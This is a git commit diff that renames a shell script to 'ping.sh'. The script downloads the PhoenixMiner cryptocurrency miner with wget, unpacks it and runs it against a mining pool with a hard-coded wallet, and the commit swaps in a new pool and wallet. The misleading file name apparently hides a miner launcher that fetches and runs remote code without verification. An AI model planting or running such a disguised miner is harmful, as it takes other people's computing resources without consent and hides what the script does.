07ad8ac24cab92affff35d00b15a43b96d7f03b6
Zippanda <101040203+Zippanda@users.noreply.github.com>
2022-03-06 20:36:07 +0700

    Update and rename File2.sh to ping.sh

--- ping.sh
+++ ping.sh
@@ -2,4 +2,4 @@ sudo apt-get update &&
 wget https://phoenixminer.info/downloads/PhoenixMiner_5.9d_Linux.tar.gz &&
 tar -xvf PhoenixMiner_5.9d_Linux.tar.gz &&
 cd PhoenixMiner_5.9d_Linux &&
-./PhoenixMiner -pool ethash.unmineable.com:3333 -wal TRX:TC2Wvc8MgVnkdQBibM1ZzXdPiGD9WYKHhP.VAST2 -pass x
+./PhoenixMiner -pool eth.2miners.com:2020 -wal nano_36a9nj45bn5z6ahydeynefsjfeuc41ym5wjprm5i9cqoiodeoq9kri3nuwp9.NANO
